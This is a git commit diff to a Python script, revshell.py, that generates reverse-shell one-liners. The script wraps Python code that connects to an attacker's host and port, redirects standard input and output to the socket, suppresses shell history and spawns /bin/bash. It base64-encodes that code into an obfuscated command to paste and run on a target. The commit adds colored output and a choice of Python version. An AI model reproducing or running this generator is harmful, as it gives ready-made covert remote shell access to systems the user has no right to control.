eaacf5deae0d13e7321159ef3cfd61ccf543aee7
Roman Sherstnev <sher-rom2013@yandex.ru>
2020-07-02 01:15:57 +0700

    Refactored reverse shell python command generator

--- Scripts/revshell.py
+++ Scripts/revshell.py
@@ -1,14 +1,11 @@
 #!/usr/bin/python3
 
 import base64
+from colorama import Fore, Style
 import sys
 
-if len(sys.argv) != 3:
-    print("Usage: revshell.py <LHOST> <LPORT>")
-    raise SystemExit
-
-CODE = '''
-import os
+def printer(ip, port, version=''):
+    CODE = '''import os
 import pty
 import socket
 import sys
@@ -17,6 +14,16 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('{}', {}))
 [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
 os.putenv("HISTFILE", '/dev/null')
-pty.spawn("/bin/bash")'''.format(sys.argv[1], sys.argv[2])
+pty.spawn("/bin/bash")'''.format(ip, port)
+    print(Style.BRIGHT + Fore.RED + "python{} -c \"import base64;exec(compile(base64.b64decode(b'{}'),'<string>','exec'))\"".format(version, str(base64.b64encode(CODE.encode("utf-8"))).split('\'')[1]))
+    
+if __name__ == '__main__':
 
-print("python3 -c \"import base64; exec(compile(base64.b64decode(b'{}'), '<string>', 'exec'))\"".format(str(base64.b64encode(CODE.encode("utf-8"))).split('\'')[1]))
+    if len(sys.argv)  == 3:
+         printer(sys.argv[1], sys.argv[2])
+    elif len(sys.argv) == 4:
+        printer(sys.argv[1], sys.argv[2], sys.argv[3])
+    else:
+        print(Style.BRIGHT + Fore.BLUE + "Usage: revshell.py <LHOST> <LPORT> [PYTHON_VERSION]")
+        raise SystemExit
+ 
